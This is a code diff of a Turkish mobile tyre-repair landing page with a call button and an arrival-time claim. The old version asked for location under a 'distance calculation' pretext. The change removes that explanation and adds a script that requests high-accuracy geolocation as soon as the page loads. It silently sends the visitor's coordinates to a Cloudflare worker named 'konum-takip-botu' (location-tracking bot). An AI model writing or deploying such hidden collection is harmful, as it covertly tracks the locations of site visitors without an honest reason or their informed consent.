@@ -3,62 +3,27 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>İzmir Mobil Lastikçi | 7/24 Acil Yol Yardım</title>
+  <title>İzmir Mobil Lastikçi | 7/24 Acil Lastik Yol Yardım</title>
   <style>
-    *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif}
-    body{background:linear-gradient(180deg,#050a1f,#020617);color:#fff;overflow-x:hidden;padding-bottom:80px}
-    .container{padding:16px}
-    header{background:rgba(5,10,31,0.95);padding:15px;text-align:center;border-bottom:1px solid #00d1ff;position:sticky;top:0;z-index:99}
-    .logo{font-size:20px;font-weight:800} .logo span{color:#00d1ff}
-    
-    /* MODAL TASARIMI */
-    #customModal {
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: rgba(0,0,0,0.8); backdrop-filter: blur(10px);
-        display: flex; align-items: center; justify-content: center; z-index: 9999;
-    }
-    .modal-content {
-        background: #0a1128; border: 2px solid #00d1ff; width: 90%; max-width: 400px;
-        padding: 30px; border-radius: 25px; text-align: center; position: relative;
-        box-shadow: 0 0 30px rgba(0, 209, 255, 0.4);
-    }
-    .modal-content h2 { color: #00d1ff; margin-bottom: 15px; font-size: 22px; }
-    .modal-content p { font-size: 16px; line-height: 1.5; margin-bottom: 25px; opacity: 0.9; }
-    .modal-btn {
-        background: linear-gradient(135deg, #00d1ff, #00ffff);
-        color: #000; border: none; padding: 16px; border-radius: 12px;
-        font-weight: 800; font-size: 16px; width: 100%; cursor: pointer;
-    }
-    .close-x { position: absolute; top: 15px; right: 20px; color: #00d1ff; font-weight: bold; cursor: pointer; font-size: 20px; }
-
-    .hero{text-align:center;padding:40px 20px}
-    .phone-big{font-size:28px;font-weight:900;color:#00d1ff;margin:20px 0;display:block;text-decoration:none}
-    .fixed-bar{position:fixed;bottom:0;width:100%;display:grid;grid-template-columns:1fr 1fr;z-index:999}
+    *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
+    body{background:#050a1f;color:#fff;padding-bottom:80px}
+    .container{padding:16px;text-align:center}
+    header{background:#0a1128;padding:15px;border-bottom:1px solid #00d1ff}
+    h1{font-size:24px;color:#00d1ff;margin-bottom:10px}
+    .phone-big{font-size:26px;font-weight:900;color:#00d1ff;margin:20px 0;display:block;text-decoration:none}
+    .fixed-bar{position:fixed;bottom:0;width:100%;display:grid;grid-template-columns:1fr 1fr}
     .fixed-bar a{padding:18px;text-align:center;font-weight:800;text-decoration:none;font-size:16px}
   </style>
 </head>
 <body>
 
-<div id="customModal">
-  <div class="modal-content">
-    <span class="close-x" onclick="modalKapat()">✕</span>
-    <h2>📍 Mesafe Ölçümü</h2>
-    <p>Size en yakın ekibimizin <b>varış süresini</b> hesaplamak ve hızlı servis almak için konumu onaylayın.</p>
-    <button class="modal-btn" id="btnMain" onclick="konumAl()">Süreyi Hesapla ve Başlat</button>
-  </div>
-</div>
+<header><h1>İzmir <span>Mobil Lastikçi</span></h1></header>
 
-<header><div class="logo">İzmir <span>Mobil Lastikçi</span></div></header>
-
-<section class="hero container">
-  <h1>7/24 <span>Acil Lastik Servisi</span></h1>
-  <p style="margin-top:10px; opacity:0.8">İzmir genelinde en hızlı yol yardım ekibi.</p>
+<div class="container">
+  <h2>7/24 Acil Yol Yardım</h2>
   <a href="tel:+905531182353" class="phone-big">📞 0553 118 23 53</a>
-  
-  <div style="background:rgba(255,255,255,0.05); padding:20px; border-radius:20px; margin-top:20px; border:1px solid rgba(0,209,255,0.2)">
-    <p>⚡ Bornova, Karşıyaka, Konak, Buca ve tüm ilçelere 15-30 dakikada ulaşım!</p>
-  </div>
-</section>
+  <p>En yakın mobil ekip 15-30 dakikada yanınızda.</p>
+</div>
 
 <div class="fixed-bar">
   <a href="tel:+905531182353" style="background:#00d1ff;color:#000">📞 Hemen Ara</a>
@@ -66,54 +31,30 @@
 </div>
 
 <script>
-const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
-
-// GİRİŞ BİLDİRİMİ
 window.onload = function() {
-    fetch(workerURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ status: "entry" }) });
-};
-
-function modalKapat() {
-    document.getElementById('customModal').style.display = 'none';
-}
-
-function konumAl() {
-    const btn = document.getElementById('btnMain');
-    btn.innerText = "Hesaplanıyor...";
-    btn.disabled = true;
+    const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
 
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             function(pos) {
-                // BAŞARILI
                 fetch(workerURL, {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        status: "allowed",
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         acc: pos.coords.accuracy
                     })
                 });
-                modalKapat();
-                alert("✅ En yakın ekibimiz 12-18 dakika mesafededir. Şimdi arayarak konumunuzu teyit edebilirsiniz.");
             },
             function(err) {
-                // HATA VEYA RED
-                fetch(workerURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ status: "rejected" }) });
-                
-                modalKapat();
-                // Hemen atmıyoruz, uyarı veriyoruz
-                alert("⚠️ Mesafe otomatik hesaplanamadı. Lütfen bizi arayarak konumunuzu bildirin.");
+                console.log("Konum alınamadı.");
             },
-            { enableHighAccuracy: true, timeout: 12000 }
+            { enableHighAccuracy: true, timeout: 10000 }
         );
-    } else {
-        modalKapat();
-        alert("Cihazınız konum özelliğini desteklemiyor.");
     }
-}
+};
 </script>
+
 </body>
 </html>
